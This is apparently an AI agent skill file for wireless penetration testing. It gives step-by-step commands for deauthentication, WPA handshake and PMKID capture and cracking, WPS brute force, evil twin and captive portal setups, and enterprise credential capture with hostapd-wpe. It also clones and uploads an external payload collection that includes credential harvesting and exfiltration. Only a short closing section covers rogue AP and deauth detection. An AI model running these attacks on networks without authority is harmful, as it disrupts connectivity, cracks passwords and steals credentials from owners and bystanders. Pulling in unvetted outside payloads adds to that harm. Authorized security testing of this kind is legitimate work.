---
name: nullsec-wifi
description: WiFi security assessment and wireless penetration testing skill. Use when auditing wireless networks, testing WPA/WPA2/WPA3 security, detecting rogue access points, performing deauthentication testing, or assessing enterprise wireless infrastructure. Includes Hak5 WiFi Pineapple integration and 183+ wireless payloads.
metadata: {"openclaw":{"emoji":"📡","requires":{"anyBins":["aircrack-ng","airodump-ng","airmon-ng","wash","reaver","hostapd"]},"os":["linux"],"primaryEnv":"","install":[]}}
---

# NullSec WiFi — Wireless Security Assessment

Complete wireless penetration testing skill covering WPA/WPA2/WPA3 cracking, rogue AP detection, evil twin attacks, enterprise wireless auditing, and Hak5 WiFi Pineapple payload deployment. Includes 183+ pre-built wireless payloads.

## When to Use

- Conducting a wireless security assessment
- Testing WPA2/WPA3 password strength
- Detecting rogue or evil twin access points
- Auditing enterprise 802.1X/RADIUS security
- Deploying WiFi Pineapple payloads
- Building custom wireless attack payloads
- Analyzing captured wireless traffic

## Quick Reference

| Attack | Tool | Time |
|--------|------|------|
| WPA2 handshake capture | airodump-ng + aireplay-ng | 2-10 min |
| WPA2 dictionary crack | aircrack-ng / hashcat | 5 min-hours |
| WPS brute force | reaver / bully | 2-10 hrs |
| Evil twin AP | hostapd + dnsmasq | 5 min setup |
| Deauth flood | aireplay-ng | Instant |
| PMKID capture | hcxdumptool | 1-5 min |
| 5GHz scanning | airodump-ng --band a | 5 min |

---

## Setup & Prerequisites

### Monitor Mode
```bash
# Check wireless interfaces
iwconfig
ip link show

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Interface becomes wlan0mon

# Verify
iwconfig wlan0mon  # Should show "Mode:Monitor"

# When done, restore managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Channel Hopping
```bash
# Scan all 2.4GHz channels
sudo airodump-ng wlan0mon

# Scan 5GHz band
sudo airodump-ng --band a wlan0mon

# Scan both bands
sudo airodump-ng --band abg wlan0mon

# Lock to specific channel
sudo airodump-ng -c 6 wlan0mon
```

---

## WPA/WPA2 Assessment

### Handshake Capture
```bash
# Step 1: Identify target network
sudo airodump-ng wlan0mon
# Note: BSSID, Channel, ESSID

# Step 2: Capture on target channel
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Step 3: Deauth to force handshake (in new terminal)
sudo aireplay-ng -0 5 -a <BSSID> -c <client-MAC> wlan0mon

# Step 4: Wait for "WPA handshake: XX:XX:XX:XX:XX:XX" in airodump
```

### PMKID Attack (Clientless)
```bash
# Capture PMKID (no client needed!)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 --filtermode=2 --filterlist_ap=<BSSID>

# Convert for hashcat
hcxpcapngtool -o hash.22000 pmkid.pcapng

# Crack with hashcat
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
```

### Dictionary Attack
```bash
# aircrack-ng (CPU)
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# hashcat (GPU — much faster)
# Convert capture first
hcxpcapngtool -o hash.22000 capture-01.cap
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt -d 1

# Custom wordlist with rules
hashcat -m 22000 hash.22000 custom-words.txt -r /usr/share/hashcat/rules/best64.rule
```

### WPS Attack
```bash
# Check for WPS-enabled APs
wash -i wlan0mon

# Reaver brute force
reaver -i wlan0mon -b <BSSID> -c <channel> -vv

# Bully (alternative)
bully -b <BSSID> -c <channel> wlan0mon

# Pixie-Dust attack (faster if vulnerable)
reaver -i wlan0mon -b <BSSID> -c <channel> -K 1 -vv
```

---

## Evil Twin / Rogue AP

### Basic Evil Twin
```bash
# hostapd config
cat > evil-twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Start fake AP
sudo hostapd evil-twin.conf

# DHCP server (separate terminal)
cat > dnsmasq-evil.conf << 'EOF'
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.50,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
EOF

sudo ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
sudo dnsmasq -C dnsmasq-evil.conf

# Enable NAT forwarding
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo sysctl net.ipv4.ip_forward=1
```

### Captive Portal
```bash
# Redirect all HTTP to captive portal
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:443

# Serve login page (use python or nginx)
cd /path/to/captive-portal
sudo python3 -m http.server 80
```

---

## Hak5 WiFi Pineapple Integration

### Pineapple Connection
```bash
# USB connection (172.16.42.1)
ssh root@172.16.42.1

# Network connection
ssh root@<pineapple-ip>

# Quick deploy payloads
scp payload.sh root@172.16.42.1:/root/payloads/
```

### NullSec Pineapple Payloads (183+ available)
```bash
# Categories available:
# - Recon (25+): WiFi scanning, client tracking, signal mapping
# - Attack (30+): Deauth, evil twin, captive portal, MitM
# - Defense (15+): Rogue AP detection, deauth alerts, monitoring
# - Exfil (10+): DNS tunneling, data siphoning
# - Automation (20+): Auto-pwn, scheduled attacks

# Deploy from NullSec suite
git clone https://github.com/bad-antics/hak5-pineapple
cd hak5-pineapple
./upload-payloads.sh root@172.16.42.1
```

### Key Payloads
| Payload | Description |
|---------|-------------|
| DeauthStorm | Mass deauthentication across channels |
| EvilTwin | Automated evil twin with captive portal |
| 5GHzHunter | Scan and target 5GHz networks |
| BeaconSpam | Flood area with fake SSIDs |
| CredHarvester | Capture credentials via fake portal |
| ClientTracker | Track devices by probe requests |
| BandHopper | Hop between 2.4/5GHz bands |
| DroneHunter | Detect and track drone WiFi |
| AIRecon | ML-based network classification |
| SignalMapper | Map signal strength heatmap |

---

## Enterprise Wireless (802.1X)

### Testing RADIUS/EAP
```bash
# Create fake RADIUS server
# Use FreeRADIUS or hostapd-wpe

# hostapd-wpe (captures enterprise creds)
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# Captured credentials will appear in the log
# Crack MSCHAP hashes with asleap
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
```

### EAP Downgrade
```bash
# Some clients accept weaker EAP methods
# hostapd-wpe supports:
# - EAP-PEAP/MSCHAPv2
# - EAP-TTLS/PAP (plaintext!)
# - EAP-TTLS/MSCHAPv2
# - EAP-MD5
```

---

## Detection & Defense

### Rogue AP Detection
```bash
# Scan for duplicate SSIDs
sudo airodump-ng wlan0mon --essid "CorpNetwork" -w rogue-check

# Compare BSSIDs against known list
# Different BSSID = potential rogue AP

# Continuous monitoring
while true; do
    sudo airodump-ng -w scan --output-format csv wlan0mon &
    sleep 60
    kill %1
    # Parse and alert on new BSSIDs
    cat scan-01.csv | grep "CorpNetwork" | awk -F',' '{print $1}'
    rm scan-01.csv
done
```

### Deauthentication Detection
```bash
# Monitor for deauth frames
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x0c" -T fields -e wlan.sa -e wlan.da

# Count deauth frames per second (attack indicator)
sudo tcpdump -i wlan0mon 'type mgt subtype deauth' -c 100 2>/dev/null | wc -l
```

---

## Tips

- **Legal:** Always have authorization — wireless testing can affect neighbors
- **Antenna matters** — directional antennas for distance, omni for area coverage
- **5GHz** — Often less tested, use `--band a` flag
- **Channel selection** — Use non-overlapping channels (1, 6, 11 for 2.4GHz)
- **MAC spoofing** — `macchanger -r wlan0mon` before testing
- **Save everything** — `airodump-ng` with `-w` flag saves pcap automatically
- **Battery** — Pineapple eats battery fast, keep it plugged in for long ops

## NullSec Resources

- **183+ Pineapple payloads** at [github.com/bad-antics/hak5-pineapple](https://github.com/bad-antics/hak5-pineapple)
- **NullSec Linux** — [bad-antics.github.io/nullsec-linux](https://bad-antics.github.io/nullsec-linux/)
- **Flipper Zero Suite** — [bad-antics.github.io/nullsec-flipper-suite](https://bad-antics.github.io/nullsec-flipper-suite/)
- **Contact:** badxantics@gmail.com
